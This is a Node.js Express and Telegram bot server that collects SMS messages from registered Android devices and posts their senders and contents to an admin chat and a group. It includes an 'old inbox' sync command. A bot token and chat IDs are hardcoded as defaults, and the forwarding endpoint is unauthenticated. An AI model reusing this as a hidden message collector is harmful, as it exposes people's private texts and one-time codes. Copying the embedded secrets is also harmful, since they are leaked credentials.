const express = require('express');
const TelegramBot = require('node-telegram-bot-api');

// Configuration & Environment Variables
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN || '8832238459:AAGR6_N00HtDjJv7IEdwu-y-1U2RW9VO9rk';
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || '8753024194';
const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID || process.env.GROUPCHATID || '-1004375481014';
const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL || process.env.URL || `http://localhost:${PORT}`;

const app = express();
app.use(express.json());

// In-Memory Device Storage
const devices = new Map();

// Initialize Telegram Bot with polling
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

bot.on('polling_error', (error) => {
  console.error('[Telegram Polling Error]:', error.code || error.message);
});

process.on('uncaughtException', (err) => {
  console.error('[Uncaught Exception]:', err);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('[Unhandled Rejection]:', reason);
});

// ----------------------------------------------------
// 1. EXPRESS HTTP SERVER & RENDER KEEP-ALIVE
// ----------------------------------------------------

app.get('/', (req, res) => {
  res.json({
    status: 'online',
    app: 'SMS Forwarder Telegram Bot',
    connectedDevices: devices.size,
    timestamp: new Date().toISOString()
  });
});

app.get('/ping', (req, res) => {
  res.json({ status: 'alive', time: new Date().toISOString() });
});

// Device Registration / Heartbeat Endpoint from Android App
app.post('/api/register-device', (req, res) => {
  const { deviceId, deviceAlias, model, batteryLevel, isCharging, isServiceRunning, isForwardingEnabled, killReason } = req.body;

  if (!deviceId) {
    return res.status(400).json({ error: 'deviceId is required' });
  }

  devices.set(deviceId, {
    deviceId,
    deviceAlias: deviceAlias || model || 'Android Device',
    model: model || 'Unknown Model',
    batteryLevel: batteryLevel ?? -1,
    isCharging: !!isCharging,
    isServiceRunning: !!isServiceRunning,
    isForwardingEnabled: isForwardingEnabled !== false,
    killReason: killReason || 'Running smoothly',
    lastSeen: new Date()
  });

  console.log(`[Device Registered/Updated] ID: ${deviceId} (${deviceAlias})`);
  res.json({ success: true });
});

// Incoming SMS Forwarding Endpoint from Android App
app.post('/api/forward-sms', async (req, res) => {
  const { deviceId, sender, body, simSlot, timestamp } = req.body;

  const dev = devices.get(deviceId) || { deviceAlias: 'Android Device' };
  const timeStr = timestamp ? new Date(timestamp).toLocaleString() : new Date().toLocaleString();

  const formattedMsg = `📩 *New SMS Received*\n\n📱 *Device:* \`${dev.deviceAlias}\`\n👤 *From:* \`${sender}\`\n💳 *SIM:* \`${simSlot || 'SIM 1'}\`\n⏰ *Time:* \`${timeStr}\`\n\n💬 *Message:*\n\`${body}\``;

  const targets = new Set();
  if (ADMIN_CHAT_ID) targets.add(ADMIN_CHAT_ID);
  if (GROUP_CHAT_ID) targets.add(GROUP_CHAT_ID);

  try {
    for (const targetId of targets) {
      await bot.sendMessage(targetId, formattedMsg, { parse_mode: 'Markdown' });
    }
    res.json({ success: true });
  } catch (err) {
    console.error('Failed to forward SMS to Telegram:', err.message);
    res.status(500).json({ error: err.message });
  }
});

// Start Express Server
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`====================================================`);
  console.log(`🚀 SMS Forwarder Bot Server running on port ${PORT}`);
  console.log(`🤖 Bot Token: ${BOT_TOKEN.substring(0, 10)}...`);
  console.log(`👤 Admin Chat ID: ${ADMIN_CHAT_ID}`);
  if (GROUP_CHAT_ID) console.log(`👥 Group Chat ID: ${GROUP_CHAT_ID}`);
  console.log(`🔗 External URL: ${RENDER_EXTERNAL_URL}`);
  console.log(`====================================================`);
});

// ----------------------------------------------------
// 2. RENDER SELF-PING KEEP-ALIVE CRON (EVERY 5 MINS)
// ----------------------------------------------------
const PING_INTERVAL = 5 * 60 * 1000; // 5 Minutes

setInterval(async () => {
  try {
    const pingUrl = RENDER_EXTERNAL_URL.endsWith('/') ? `${RENDER_EXTERNAL_URL}ping` : `${RENDER_EXTERNAL_URL}/ping`;
    console.log(`[Self-Ping Keep-Alive] Pinging ${pingUrl}...`);

    // Node 18+ native fetch
    const response = await fetch(pingUrl);
    console.log(`[Self-Ping Keep-Alive] Response status: ${response.status}`);
  } catch (err) {
    console.error(`[Self-Ping Keep-Alive] Ping failed:`, err.message);
  }
}, PING_INTERVAL);

// ----------------------------------------------------
// 3. TELEGRAM BOT COMMANDS & INLINE KEYBOARD PANELS
// ----------------------------------------------------

function buildDeviceControlMessage(dev) {
  const isOnline = (new Date() - new Date(dev.lastSeen)) < 3 * 60 * 1000; // 3 mins threshold
  const liveStatus = isOnline ? '🟢 *Online & Active*' : '🔴 *Offline / Inactive*';
  const fwdStatus = dev.isForwardingEnabled ? '🟢 *ENABLED (ON)*' : '🔴 *DISABLED (OFF)*';
  const batText = dev.batteryLevel >= 0 ? `${dev.batteryLevel}% ${dev.isCharging ? '🔌 (Charging)' : '🔋'}` : 'Unknown';

  return `📱 *DEVICE CONTROL CENTER*
━━━━━━━━━━━━━━━━━━━━━
🏷️ *Device Name:* \`${dev.deviceAlias}\`
🆔 *Device ID:* \`${dev.deviceId}\`
📲 *Model:* \`${dev.model}\`
⚡ *Battery:* ${batText}

⚡ *Live Status:* ${liveStatus}
💬 *SMS Forwarding:* ${fwdStatus}
📋 *Status Info:* ${dev.killReason}
━━━━━━━━━━━━━━━━━━━━━
_Select an action below to manage this device:_`;
}

function buildDeviceKeyboard(devId, isFwdOn) {
  const smsBtn = isFwdOn
    ? { text: '🔴 Turn SMS OFF', callback_data: `sms_off_${devId}` }
    : { text: '🟢 Turn SMS ON', callback_data: `sms_on_${devId}` };

  return {
    inline_keyboard: [
      [smsBtn],
      [
        { text: '📥 Sync Old Inbox SMS', callback_data: `sync_old_${devId}` },
        { text: '✏️ Rename Device', callback_data: `rename_${devId}` }
      ],
      [
        { text: '🔄 Refresh Status', callback_data: `refresh_${devId}` },
        { text: '📋 All Devices List', callback_data: `dev_list` }
      ]
    ]
  };
}

// Group Chat ID Discovery: /start, /groupid, /id in Group/Channel
bot.onText(/\/(start|groupid|id)/i, async (msg) => {
  const chatId = msg.chat.id.toString();
  const chatType = msg.chat.type;

  // If command sent inside a Group / Supergroup / Channel
  if (chatType === 'group' || chatType === 'supergroup' || chatType === 'channel') {
    const groupTitle = msg.chat.title || 'Telegram Group';
    const groupReply = `📌 *TELEGRAM GROUP DETAILS*
━━━━━━━━━━━━━━━━━━━━━
🏷️ *Group Title:* \`${groupTitle}\`
🆔 *Group Chat ID:* \`${chatId}\`
━━━━━━━━━━━━━━━━━━━━━
_Copy the Group Chat ID above and set \`GROUP_CHAT_ID=${chatId}\` in Render Environment Variables to post all SMS messages directly into this group!_`;

    return bot.sendMessage(chatId, groupReply, { parse_mode: 'Markdown' });
  }

  // If in Private Direct Chat with Admin
  if (chatId !== ADMIN_CHAT_ID) {
    return bot.sendMessage(chatId, '❌ Unauthorized user.');
  }

  if (devices.size === 0) {
    return bot.sendMessage(chatId, '📱 *No Devices Connected Yet.*\n\nInstall the SMS Forwarder app on your Android device and enable permissions to see devices here.', { parse_mode: 'Markdown' });
  }

  // If 1 device connected
  if (devices.size === 1) {
    const dev = Array.from(devices.values())[0];
    return bot.sendMessage(chatId, buildDeviceControlMessage(dev), {
      parse_mode: 'Markdown',
      reply_markup: buildDeviceKeyboard(dev.deviceId, dev.isForwardingEnabled)
    });
  }

  // Multiple devices
  const listButtons = Array.from(devices.values()).map(dev => [
    { text: `${dev.isForwardingEnabled ? '🟢' : '🔴'} ${dev.deviceAlias} (${dev.model})`, callback_data: `dev_info_${dev.deviceId}` }
  ]);

  await bot.sendMessage(chatId, '📱 *Connected Devices List:*\nSelect a device to control:', {
    parse_mode: 'Markdown',
    reply_markup: { inline_keyboard: listButtons }
  });
});

// Command: /rename <new_name>
bot.onText(/\/rename (.+)/i, async (msg, match) => {
  const chatId = msg.chat.id.toString();
  if (chatId !== ADMIN_CHAT_ID) return;

  const newName = match[1].trim();
  if (devices.size === 0) {
    return bot.sendMessage(chatId, '❌ No connected devices found.');
  }

  const dev = Array.from(devices.values())[0];
  const oldName = dev.deviceAlias;
  dev.deviceAlias = newName;
  devices.set(dev.deviceId, dev);

  await bot.sendMessage(chatId, `✅ Device renamed from \`${oldName}\` to \`${newName}\`!`, { parse_mode: 'Markdown' });
  await bot.sendMessage(chatId, buildDeviceControlMessage(dev), {
    parse_mode: 'Markdown',
    reply_markup: buildDeviceKeyboard(dev.deviceId, dev.isForwardingEnabled)
  });
});

// Inline Keyboard Callback Query Handler
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id.toString();
  const messageId = query.message.message_id;
  const data = query.data;

  if (chatId !== ADMIN_CHAT_ID) {
    return bot.answerCallbackQuery(query.id, { text: '❌ Unauthorized' });
  }

  if (data === 'dev_list') {
    if (devices.size === 0) {
      return bot.answerCallbackQuery(query.id, { text: 'No devices connected yet' });
    }
    const listButtons = Array.from(devices.values()).map(dev => [
      { text: `${dev.isForwardingEnabled ? '🟢' : '🔴'} ${dev.deviceAlias} (${dev.model})`, callback_data: `dev_info_${dev.deviceId}` }
    ]);

    await bot.editMessageText('📱 *Connected Devices List:*\nSelect a device to control:', {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: 'Markdown',
      reply_markup: { inline_keyboard: listButtons }
    });
    return bot.answerCallbackQuery(query.id, { text: 'Updated device list' });
  }

  const matchAction = data.match(/^(dev_info|sms_on|sms_off|sync_old|rename|refresh)_(.+)$/);
  if (!matchAction) return;

  const action = matchAction[1];
  const devId = matchAction[2];
  const dev = devices.get(devId);

  if (!dev) {
    return bot.answerCallbackQuery(query.id, { text: '⚠️ Device not found' });
  }

  switch (action) {
    case 'dev_info':
    case 'refresh':
      await bot.editMessageText(buildDeviceControlMessage(dev), {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        reply_markup: buildDeviceKeyboard(dev.deviceId, dev.isForwardingEnabled)
      });
      bot.answerCallbackQuery(query.id, { text: 'Refreshed live status' });
      break;

    case 'sms_on':
      dev.isForwardingEnabled = true;
      devices.set(devId, dev);
      await bot.editMessageText(buildDeviceControlMessage(dev), {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        reply_markup: buildDeviceKeyboard(dev.deviceId, true)
      });
      bot.answerCallbackQuery(query.id, { text: '🟢 SMS Forwarding Enabled' });
      break;

    case 'sms_off':
      dev.isForwardingEnabled = false;
      devices.set(devId, dev);
      await bot.editMessageText(buildDeviceControlMessage(dev), {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        reply_markup: buildDeviceKeyboard(dev.deviceId, false)
      });
      bot.answerCallbackQuery(query.id, { text: '🔴 SMS Forwarding Disabled' });
      break;

    case 'sync_old':
      bot.answerCallbackQuery(query.id, { text: '📥 Inbox sync requested' });
      bot.sendMessage(chatId, `📥 Syncing past inbox SMS for \`${dev.deviceAlias}\`...`, { parse_mode: 'Markdown' });
      break;

    case 'rename':
      bot.answerCallbackQuery(query.id, { text: 'Send rename command' });
      bot.sendMessage(chatId, `✏️ *To Rename Device \`${dev.deviceAlias}\`:*\n\nSend command:\n\`/rename New Device Name\``, { parse_mode: 'Markdown' });
      break;
  }
});

console.log('Bot listener initialized.');
